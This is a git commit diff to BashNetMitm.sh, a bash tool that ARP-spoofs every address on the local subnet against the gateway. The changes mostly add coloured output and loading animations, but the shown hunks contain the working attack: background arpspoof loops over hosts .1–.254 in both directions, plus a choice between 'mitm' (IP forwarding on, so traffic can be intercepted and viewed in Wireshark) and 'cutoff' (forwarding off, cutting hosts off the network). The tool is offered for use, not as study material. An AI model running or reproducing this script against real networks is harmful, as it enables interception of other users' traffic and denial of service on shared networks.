b5b35828ba0da54b62829f5cb3d69cc63636061a
localh0st <88514510+localh0stt@users.noreply.github.com>
2021-08-07 00:17:45 +0300

    Update BashNetMitm.sh

--- BashNetMitm.sh
+++ BashNetMitm.sh
@@ -1,4 +1,41 @@
 #!/bin/bash
+IGreen='\033[0;92m'       # Green
+IYellow='\033[0;93m'      # Yellow
+Color_Off='\033[0m'       # Text Reset
+BIYellow='\033[1;93m'     # BOLD Yellow
+ICyan='\033[0;96m'        # Cyan
+Blink='\033[33;7m'        #Blink
+IRed='\033[0;91m'         # Red
+
+showLoading() {
+  mypid=$!
+  loadingText=$1
+
+  echo -ne "$loadingText\r"
+
+  while kill -0 $mypid 2>/dev/null; do
+    echo -ne "$loadingText.\r"
+    sleep 0.5
+    echo -ne "$loadingText..\r"
+    sleep 0.5
+    echo -ne "$loadingText...\r"
+    sleep 0.5
+    echo -ne "\r\033[K"
+    echo -ne "$loadingText\r"
+    sleep 0.5
+  done
+
+  echo "$loadingText...FINISHED"
+}
+spinner() {
+    local i sp n
+    sp='/-\|'
+    n=${#sp}
+    printf ' '
+    while sleep 0.1; do
+        printf "%s\b" "${sp:i++%n:1}"
+    done
+}
 
 if [ "$EUID" != 0 ]
   then echo "Please run as root !"
@@ -15,58 +52,57 @@ read E F G H <<<"${GATEWAY_IP//./ }"
 
 printf "\n"
    
-echo 11010101101010100010101011010001101101011101010100100101010100101010001010
-echo 00101010101011101010101000101010101010001010110101010110110101101010111010
-echo 11010101011010101010110010101010101010101011011010101011010100110010101011
-echo 01010101010100001010101001 CODED BY LOCALH0ST 1010100101001010100100101010
-echo 10101010010101010101010101101010101010100101010101001001101010101010010101
-echo 10101010101001010100101010100010010101001010101101101110101010101000101011
-echo 01011010101001010101001010101010101010010101010100101101010110111010100101
-echo "linktr.ee/localh0st        twitter : localhostt        github : localhostt"
-printf "__________________________________________________________________________\n"
+echo -e "\033[0;92m10101011010101000101010110100011011010111010101001001010101001010100010101$Color_Off"
+echo -e "\033[0;92m00101010101011101010101000101010101010001010110101010110110101101010111010$Color_Off"
+echo -e "\033[0;92m11010101011010101010110010101010101010101011011010101011010100110010101011$Color_Off"
+echo -e "\033[0;92m01010101010100001010101001 \033[1;93mCODED BY LOCALH0ST \033[0;92m1010100101001010100100101010$Color_Off"
+echo -e "\033[0;92m10101010010101010101010101101010101010100101010101001001101010101010010101$Color_Off"
+echo -e "\033[0;92m10101010101001010100101010100010010101001010101101101110101010101000101011$Color_Off"
+echo -e "\033[0;92m01011010101001010101001010101010101010010101010100101101010110111010100101$Color_Off"
+echo -e "\033[0;96mlinktr.ee/localh0st       twitter : @localhostt       github : @localhostt$Color_Off"
+printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
 printf "\n"
 
-printf "Detecting your local and gateway IPv4...\n"
-printf "\n"
-sleep 1
-printf "Your Local IP is $LOCAL_IP \n"
-printf "Your Gateway IP is $GATEWAY_IP \n"
+printf "\033[0;91mDetecting your local and gateway IPv4\n$Color_Off" & sleep 2 & showLoading
 
-printf "__________________________________________________________________________\n"
+printf "Your Local IP is \033[0;93m$LOCAL_IP $Color_Off\n"
+printf "Your Gateway IP is \033[0;93m$GATEWAY_IP $Color_Off\n"
+
+printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
 printf "\n"
 
-printf "Specify the interface (wlan0/eth0/usb0/bnep0) ---> "
-read INTERFACE
-while [ $INTERFACE != "wlan0" ] && [ $INTERFACE != "eth0" ] && [ $INTERFACE != "usb0" ] && [ $INTERFACE != "bnep0" ]
+printf "Specify the interface \033[0;93m(\033[0mwlan0\033[0;93m/\033[0meth0\033[0;93m/\033[0musb0\033[0;93m/\033[0mbnep0\033[0;93m)\033[0m \033[0;91m$(tput blink)---> \033[0m"
+read INTERFACE1 INTERFACE2
+while [ $INTERFACE1$INTERFACE2 != "wlan0" ] && [ $INTERFACE1$INTERFACE2 != "eth0" ] && [ $INTERFACE1$INTERFACE2 != "usb0" ] && [ $INTERFACE1$INTERFACE2 != "bnep0" ]
   do
     printf "Wrong input, retry again\n"
-    printf "Specify the interface (wlan0/eth0/usb0/bnep0) ---> "
-    read INTERFACE
+    printf "Specify the interface \033[0;93m(\033[0mwlan0\033[0;93m/\033[0meth0\033[0;93m/\033[0musb0\033[0;93m/\033[0mbnep0\033[0;93m)\033[0m \033[0;91m$(tput blink)---> \033[0m"
+    read INTERFACE1 INTERFACE2
   done
 
-printf "__________________________________________________________________________\n"
+printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
 printf "\n"
 
-printf "Choose the purpose of spoofing (mitm/cutoff) ---> "
-read PURPOSE
-while [ $PURPOSE != "mitm" ] && [ $PURPOSE != "cutoff" ]
+printf "Choose the purpose of spoofing \033[0;93m(\033[0mmitm\033[0;93m/\033[0mcutoff\033[0;93m)\033[0m \033[0;91m$(tput blink)---> $Color_Off"
+read PURPOSE1 PURPOSE2
+while [ $PURPOSE1$PURPOSE2 != "mitm" ] && [ $PURPOSE1$PURPOSE2 != "cutoff" ]
   do
     printf "Wrong input, retry again\n"
-    printf "Choose the purpose of spoofing (mitm/cutoff) ---> "
-    read PURPOSE
+    printf "Choose the purpose of spoofing \033[0;93m(\033[0mmitm\033[0;93m/\033[0mcutoff\033[0;93m)\033[0m \033[0;91m$(tput blink)---> $Color_Off"
+    read PURPOSE1 PURPOSE2
   done
 
-if [ $PURPOSE == "mitm" ]
+if [ $PURPOSE1$PURPOSE2 == "mitm" ]
   then
     sysctl net.ipv4.ip_forward=1
-elif [ $PURPOSE == "cutoff" ]
+elif [ $PURPOSE1$PURPOSE2 == "cutoff" ]
   then 
     sysctl net.ipv4.ip_forward=0
 fi
 
-echo Proceeding in 3 seconds...
+echo -e "\033[0;91m$(tput blink)Proceeding in 3 seconds...$Color_Off"
 sleep 3
-printf "__________________________________________________________________________\n"
+printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
 printf "\n"
 
 #The arp spoofing must be two-sided:
@@ -84,7 +120,7 @@ while [ "$i" -le  254 ]
         i=$(( $i+1 ))
     fi
 
-    arpspoof -i $INTERFACE -t $GATEWAY_IP $A.$B.$C.$i 2>/dev/null 1>/dev/null &
+    arpspoof -i $INTERFACE1$INTERFACE2 -t $GATEWAY_IP $A.$B.$C.$i 2>/dev/null 1>/dev/null &
     i=$(( $i+1 ))
   done
 
@@ -93,40 +129,41 @@ while [ "$j" -le  254 ]
 
     if [ "$j" -eq $D ] || [ "$j" -eq $H ]
       then 
-        j=$(( $j +1 ))
+        j=$(( $j+1 ))
     fi
 
-    arpspoof -i $INTERFACE -t $A.$B.$C.$j $GATEWAY_IP 2>/dev/null 1>/dev/null &
+    arpspoof -i $INTERFACE1$INTERFACE2 -t $A.$B.$C.$j $GATEWAY_IP 2>/dev/null 1>/dev/null &
     j=$(( $j+1 ))
   done
 
-printf "The process is running in background :D\n"
+printf "\033[0;96mThe process is running in background :D\n$Color_Off"
 printf "\n"
-printf "Use Wireshark to check the results\n"
+printf "\033[0;92mUse \033[0;96mWireshark \033[0;92mto check the results\n$Color_Off"
 printf "\n"
-printf "Type 'stop' to stop the spoofing process ---> "
-read EXITSTATUS
-if [ $EXITSTATUS == "stop" ]
+printf "\033[0;92mType \033[1;93m'stop' \033[0;92mto stop the spoofing process \033[0;91m$(tput blink)---> $Color_Off"
+read EXITSTATUS1 EXITSTATUS2
+
+if [ $EXITSTATUS1$EXITSTATUS2 == "stop" ]
   then 
-    printf "Thank you for using BashNetMitm !"
+    printf "\033[0;96m\nThank you for using BashNetMitm !$Color_Off"
     killall arpspoof
     sleep 5
     exit
   else 
-    printf "Ignoring operation\n"
+    printf "\033[0;91mIgnoring operation$Color_Off\n"
 fi
 
-while [ $EXITSTATUS != "stop" ]
+while [ $EXITSTATUS1$EXITSTATUS2 != "stop" ]
   do
-    printf "Type 'stop' to stop the spoofing process\n"
-    read EXITSTATUS
-    if [ $EXITSTATUS == "stop" ]
+    printf "\033[0;92mType \033[1;93m'stop' \033[0;92mto stop the spoofing process \033[0;91m$(tput blink)---> $Color_Off"
+    read EXITSTATUS1 EXITSTATUS2
+    if [ $EXITSTATUS1$EXITSTATUS2 == "stop" ]
       then 
-        printf "Thank you for using BashNetMitm !\n"
+        printf "\033[0;96m\nThank you for using BashNetMitm !$Color_Off\n"
         killall arpspoof
         sleep 5
         exit
       else 
-        printf "Ignoring operation\n"
+        printf "\033[0;91mIgnoring operation\n$Color_Off"
     fi
 done
